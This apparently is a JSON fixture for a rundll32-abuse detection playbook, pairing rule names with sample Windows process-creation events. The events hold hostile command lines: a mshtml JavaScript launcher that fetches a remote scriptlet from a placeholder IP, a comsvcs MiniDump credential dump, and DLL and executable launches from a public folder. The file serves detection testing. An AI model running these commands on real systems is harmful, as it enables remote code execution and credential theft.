{
 "playbook": "signal_rundll32_abuse",
 "fires": [
  {
   "rule": "Rundll32 JavaScript Execution",
   "events": [
    {
     "fields": {
      "windows.event_id": 4688,
      "windows.channel": "Security",
      "NewProcessName": "C:\\Windows\\System32\\rundll32.exe",
      "CommandLine": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://203.0.113.7/x\")",
      "SubjectUserName": "alice"
     }
    }
   ]
  },
  {
   "rule": "Rundll32 URL or Shell Handler",
   "events": [
    {
     "fields": {
      "windows.event_id": 1,
      "windows.channel": "Microsoft-Windows-Sysmon/Operational",
      "Image": "C:\\Windows\\System32\\rundll32.exe",
      "CommandLine": "rundll32.exe url.dll,FileProtocolHandler C:\\Users\\Public\\a.exe",
      "User": "CORP\\alice"
     }
    }
   ]
  },
  {
   "rule": "Rundll32 Comsvcs MiniDump",
   "events": [
    {
     "fields": {
      "windows.event_id": 4688,
      "windows.channel": "Security",
      "NewProcessName": "C:\\Windows\\System32\\rundll32.exe",
      "CommandLine": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll #24 624 C:\\temp\\l.dmp full",
      "SubjectUserName": "alice"
     }
    }
   ]
  },
  {
   "rule": "Rundll32 DLL From User Writable Path",
   "events": [
    {
     "fields": {
      "windows.event_id": 4688,
      "windows.channel": "Security",
      "NewProcessName": "C:\\Windows\\System32\\rundll32.exe",
      "CommandLine": "rundll32.exe C:\\Users\\Public\\payload.dll,Start",
      "SubjectUserName": "alice"
     }
    }
   ]
  }
 ],
